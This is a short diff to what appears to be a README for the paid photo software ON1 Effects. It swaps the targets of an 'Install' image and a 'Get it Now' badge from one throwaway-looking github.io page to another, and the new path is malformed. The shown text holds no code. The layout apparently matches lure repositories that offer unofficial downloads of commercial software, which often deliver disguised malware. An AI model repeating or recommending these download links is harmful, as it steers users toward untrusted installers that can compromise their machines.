@@ -6,7 +6,7 @@
 
 <div align="center">
 
-[![Install](https://i.postimg.cc/HWQSXqhp/68747470733a2f2f692e706f7374696d.png)](https://jjfhjfk3858.github.io/.github/on1Effects)
+[![Install](https://i.postimg.cc/HWQSXqhp/68747470733a2f2f692e706f7374696d.png)](https://poke-pokemon.github.io/.githubon1Effects)
 
 </div>
 
@@ -81,7 +81,7 @@ ON1 Effects occupies a specific position in the photography workflow — it's no
 
 <p align="center">
 
-[![Get it Now ON1 Effects](https://img.shields.io/badge/Get_it_Now-0582CA?style=for-the-badge&logo=apple&logoColor=white)](https://jjfhjfk3858.github.io/.github/on1Effects)
+[![Get it Now ON1 Effects](https://img.shields.io/badge/Get_it_Now-0582CA?style=for-the-badge&logo=apple&logoColor=white)](https://poke-pokemon.github.io/.githubon1Effects)
 
 </p>
 
